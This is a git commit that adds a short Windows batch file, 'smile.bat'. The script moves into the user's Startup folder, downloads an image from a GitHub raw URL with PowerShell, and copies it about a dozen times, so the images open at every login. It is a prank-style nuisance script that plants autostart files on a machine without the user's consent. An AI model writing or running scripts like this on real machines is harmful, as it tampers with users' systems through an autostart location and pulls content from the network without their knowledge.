664c1e606a850c7cfbb53105a206e5ee711e7498
CapBlack <139591133+CapBlack414@users.noreply.github.com>
2023-11-29 19:33:52 +0200

    Add files via upload

---
+++ smile.bat
@@ -0,0 +1,15 @@
+cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
+Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/CapBlack414/Hash0x1/main/smile.jpg' -outfile mowafy.jpg"
+copy mowafy.jpg  mowafy-.jpg
+copy mowafy-.jpg  mowafy--.jpg
+copy mowafy--.jpg  mowafy---.jpg
+copy mowafy---.jpg  mowafy----.jpg
+copy mowafy----.jpg  mowafy-----.jpg
+copy mowafy-----.jpg  mowafy------.jpg
+copy mowafy------.jpg  mowafy-------.jpg
+copy mowafy-------.jpg  mowafy--------.jpg
+copy mowafy--------.jpg  mowafy---------.jpg
+copy mowafy---------.jpg  mowafy----------.jpg
+copy mowafy----------.jpg  mowafy-----------.jpg
+copy mowafy-----------.jpg  mowafy------------.jpg
+copy mowafy------------.jpg  mowafy-------------.jpg
